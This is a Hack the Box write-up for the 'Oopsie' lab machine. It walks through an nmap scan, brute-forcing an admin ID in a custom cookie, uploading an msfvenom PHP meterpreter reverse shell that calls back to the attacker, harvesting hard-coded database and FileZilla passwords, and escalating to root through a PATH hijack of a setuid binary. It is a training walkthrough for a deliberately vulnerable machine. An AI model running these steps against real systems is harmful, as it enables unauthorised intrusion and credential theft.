+++
title = "Hack the Box: Oopsie"
date = 2023-01-15
description = "Hack the Box: Oopsie"
tags = [
    "Hack the Box",
    "Write-up"
]
+++

# Oopsie

## Enumeration

### Nmap

```
# nmap -p- -T4 -A 10.10.10.28
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-24 10:05 CEST
Nmap scan report for 10.10.10.28
Host is up (0.028s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/24%OT=22%CT=1%CU=37344%PV=Y%DS=2%DC=T%G=Y%TM=5EA29DE
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   43.43 ms 10.10.14.1
2   43.48 ms 10.10.10.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 60.15 seconds
```

### Burp and connection to the admin panel:

We can see /cdn/login from the target -> Site map burp function we can try to login with `MEGACORP_4dm1n!!` password from the last machine compromised.

We can also see that our admin id is 1 and the cookie is “custom made” we can try to brute force the id in order to find the super admin one and get access to the upload page. hit CTRL + i, set the position on the `1` and generate with bash ``for i in `seq 1 100`; do echo $i; done`` a sequence of numbers. Add them to the payload and check `Follow redirections: Always` and `process cookies in redirections`. One request is bigger than the other and while examining it we can get the super admin id `86575`.

Now using burp we can access to the upload page.

## Foothold

### Reverse shell

Let’s build a reverse shell with msfvenom first:

```
# msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=6000 -f raw -o shell.php
```

Upload it using the /upload/ page and burp (you need to modify the user id to achieve it). We have no idea where the file has be dropped so let’s enumerate directories using dirsearch from github:

```
# python3 dirsearch.py -u http://10.10.10.28 -e php
```

We guess the reverse shell is in the /upload/. We need to set-up an handler to get our meterpreter working:

```
# msf5 exploit(multi/handler) > use exploit/multi/handler
# msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
# msf5 exploit(multi/handler) > set LHOTS tun0
# msf5 exploit(multi/handler) > set LPORT 6000
# msf5 exploit(multi/handler) > run
```

Trigger the reverse shell with:

```
# curl http://10.10.10.28/uploads/shell.php
```

This should pop a meterpreter. In the meterpreter run `shell`. You should be able to run the following:

```
# SHELL=/bin/bash script -q /dev/null
# stty raw -echo
# fg
# reset
# xterm
```

```
# id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

We can see the sticky bit setuid :

```
# find / -type f -group bugtracker 2>/dev/null
/usr/bin/bugtracker
# ls -al /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25 10:14 /usr/bin/bugtracker
```

### Lateral movement

We can get the user credentials from the db.php file:

```
# ls /var/www/html/cdn-cgi/login/
# cat /var/www/html/cdn-cgi/login/db.php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

We can now ssh using those credential and get the user flag in:

```
# cat /home/robert/user.txt
```

## Privilege escalation

```
# export PATH=/tmp:$PATH
# cd /tmp/
# echo '/bin/sh' > cat
# chmod +x cat
# /usr/bin/bugtracker
```

We can get ftpuser account and password in:

```
# strings /root/.config/filezilla/filezilla.xml
...
<User>ftpuser</User>
<Pass>mc@F1l3ZilL4</Pass>
...
```

```
# cat /root/root.txt
```